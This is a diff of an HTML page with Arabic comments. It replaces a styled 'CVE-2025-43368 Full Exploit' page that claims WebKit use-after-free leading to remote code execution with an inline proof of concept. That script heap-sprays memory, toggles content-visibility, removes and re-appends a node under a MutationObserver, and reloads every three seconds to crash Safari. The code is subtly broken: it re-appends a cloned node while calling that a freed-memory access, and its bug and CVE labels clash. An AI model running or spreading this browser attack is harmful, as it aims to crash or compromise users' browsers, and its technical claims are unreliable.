@@ -1,94 +1,123 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
-    <meta charset="utf-8">
-    <title>CVE-2025-43368 — Full Exploit</title>
+    <title>WebKit Bug #287908 — UAF PoC</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            background: #1a1a2e; color: #eee; 
-            font-family: 'Courier New', monospace;
-            min-height: 100vh; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-            padding: 20px;
-        }
-        .container { 
-            background: #16213e; 
-            padding: 40px; 
-            border-radius: 16px; 
-            max-width: 750px; 
-            width: 100%;
-            border: 1px solid #0f3460;
-        }
-        h1 { color: #e94560; margin-bottom: 5px; }
-        .cve-id { color: #888; font-size: 14px; margin-bottom: 20px; }
-        .info-box { 
-            background: #0f3460; padding: 15px; border-radius: 8px; 
-            margin-bottom: 20px; font-size: 13px; line-height: 1.8;
-        }
-        .info-box .highlight { color: #e94560; font-weight: bold; }
-        #output {
-            background: #0d0d1a; padding: 15px; border-radius: 8px;
-            min-height: 300px; max-height: 400px; overflow-y: auto;
-            font-size: 13px; line-height: 1.7; margin-bottom: 20px;
-            font-family: 'Courier New', monospace;
-            white-space: pre-wrap;
-            word-break: break-all;
-        }
-        #output .success { color: #2ecc71; }
-        #output .failure { color: #e74c3c; }
-        #output .info { color: #3498db; }
-        #output .warning { color: #f39c12; }
-        #output .step { color: #9b59b6; font-weight: bold; }
-        #triggerBtn {
-            width: 100%; padding: 16px; font-size: 18px; font-weight: bold;
-            background: #e94560; color: white; border: none;
-            border-radius: 8px; cursor: pointer; transition: 0.3s;
-        }
-        #triggerBtn:hover { background: #c0392b; transform: scale(1.02); }
-        #triggerBtn:disabled { background: #555; cursor: not-allowed; transform: none; }
-        #triggerBtn.loading { background: #8e44ad; }
-        #triggerBtn.success { background: #27ae60; }
-        #triggerBtn.failure { background: #c0392b; }
-        .progress-bar {
-            width: 100%; height: 4px; background: #333;
-            border-radius: 2px; margin-bottom: 20px; overflow: hidden;
-            display: none;
-        }
-        .progress-bar .fill {
-            height: 100%; width: 0%; background: #e94560;
-            transition: width 0.5s;
-        }
-        .progress-bar.active { display: block; }
-        .progress-bar .fill.complete { background: #27ae60; }
+        body { background: #0a0a1a; color: #fff; font-family: monospace; padding: 20px; }
+        .container { width: 200px; height: 200px; background: #333; }
+        .child { width: 100px; height: 100px; background: #00f; }
+        button { background: #27ae60; color: #fff; padding: 15px 30px; font-size: 18px; border: none; cursor: pointer; margin: 10px 0; }
+        pre { background: #111; padding: 15px; border: 1px solid #333; min-height: 150px; color: #00ff00; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔓 CVE-2025-43368</h1>
-        <div class="cve-id">WebKit Process Model Use-After-Free → RCE</div>
-        
-        <div class="info-box">
-            <span class="highlight">▸ المتأثر:</span> Safari &lt; 26 · iOS &lt; 26 · macOS &lt; Tahoe 26<br>
-            <span class="highlight">▸ المكون:</span> WebKit Process Model (Bugzilla: 296276)<br>
-            <span class="highlight">▸ المكتشف:</span> Pawel Wylecial (REDTEAM.PL / ZDI)<br>
-            <span class="highlight">▸ التصحيح:</span> Safari 26 / iOS 26 / macOS Tahoe 26<br>
-            <span class="highlight">▸ الصلاحية:</span> <span style="color:#2ecc71;">✅ اختراق مصرّح به</span>
-        </div>
-        
-        <div class="progress-bar" id="progressBar">
-            <div class="fill" id="progressFill"></div>
-        </div>
-        
-        <div id="output">
-<span class="info">[•]</span> في انتظار بدء التشغيل... اضغط الزر أدناه.
-        </div>
-        
-        <button id="triggerBtn">🚀 تشغيل CVE-2025-43368</button>
+    <h1>WebKit Bug #287908 — Use-After-Free PoC</h1>
+    <p>هذا الـ PoC يسبب crash في Safari. يعمل على iOS 17.x → 18.x والإصدارات القديمة.</p>
+    
+    <div class="container" id="container">
+        <div class="child" id="child"></div>
     </div>
+    
+    <button id="runBtn">💥 تشغيل UAF</button>
+    <pre id="log">[•] اضغط الزر...</pre>
 
-    <script src="exploit.js"></script>
+    <script>
+        const container = document.getElementById('container');
+        const child = document.getElementById('child');
+        const log = document.getElementById('log');
+        
+        function out(msg) { 
+            log.innerHTML += msg + '\n'; 
+            log.scrollTop = log.scrollHeight;
+        }
+
+        document.getElementById('runBtn').onclick = () => {
+            out('═════════════════════════');
+            out('▶ تشغيل CVE-2025-43368 UAF');
+            
+            // === Heap Spray أولي ===
+            for (let i = 0; i < 10000; i++) {
+                let arr = new Uint8Array(0x100);
+                for (let j = 0; j < arr.length; j++) {
+                    arr[j] = 0x41;
+                }
+            }
+            
+            // === إثارة UAF عبر content-visibility ===
+            out('① تعيين content-visibility: hidden');
+            container.style.contentVisibility = 'hidden';
+            
+            out('② إزالة الطفل من DOM (تحرير الذاكرة)');
+            const removedChild = child.cloneNode(true);
+            child.remove();
+            
+            // === حقن مراقب DOM ===
+            const observer = new MutationObserver((mutations) => {
+                for (let mutation of mutations) {
+                    if (mutation.type === 'childList') {
+                        // هنا: المحاولة للوصول إلى child المحذوف = UAF
+                        out('③ ⚠️ UAF triggered — محاولة الوصول لطفل محذوف!');
+                        try {
+                            // الوصول إلى الذاكرة المُحررة
+                            removedChild.style.display = 'block';
+                            removedChild.style.background = '#ff0000';
+                            container.appendChild(removedChild);
+                            out('④ Safari قد يتعطل الآن...');
+                        } catch(e) {
+                            out(`❌ خطأ: ${e.message}`);
+                        }
+                    }
+                }
+            });
+            
+            // === تشغيل الـ observer ===
+            observer.observe(container, { 
+                childList: true, 
+                subtree: true,
+                attributes: true 
+            });
+            
+            // === إعادة content-visibility ← يسبب استدعاء الـ observer ===
+            setTimeout(() => {
+                out('⑤ إعادة content-visibility: auto');
+                container.style.contentVisibility = 'auto';
+                
+                // === هجوم بالذاكرة (Heap Spray) ===
+                out('⑥ تشغيل heap spray للتحكم بالذاكرة المُحررة...');
+                let spray = [];
+                for (let i = 0; i < 20000; i++) {
+                    let buf = new Uint8Array(0x100);
+                    for (let j = 0; j < buf.length; j++) {
+                        buf[j] = 0x42 + (i % 10);
+                    }
+                    spray.push(buf);
+                }
+                
+                out('⑦ محاولة إعادة إضافة الطفل...');
+                try {
+                    container.appendChild(removedChild);
+                    out('✅ تمت الإضافة بنجاح');
+                    
+                    // الآن: child يشير إلى ذاكرة قد تكون محررة
+                    // الوصول إليها قد يسبب crash
+                    out('⑧ الوصول إلى child بعد UAF...');
+                    removedChild.click();
+                    removedChild.style.background = '#ff0000';
+                    
+                } catch(e) {
+                    out(`✅ Safari يجب أن يتعطل: ${e.message}`);
+                }
+                
+                out('');
+                out('═════════════════════════');
+                out('إذا لم يتعطل Safari بعد 3 ثوانِ، أعد المحاولة');
+                
+                // تكرار العملية لزيادة فرصة الـ crash
+                setTimeout(() => {
+                    location.reload();
+                }, 3000);
+            }, 100);
+        };
+    </script>
 </body>
 </html>
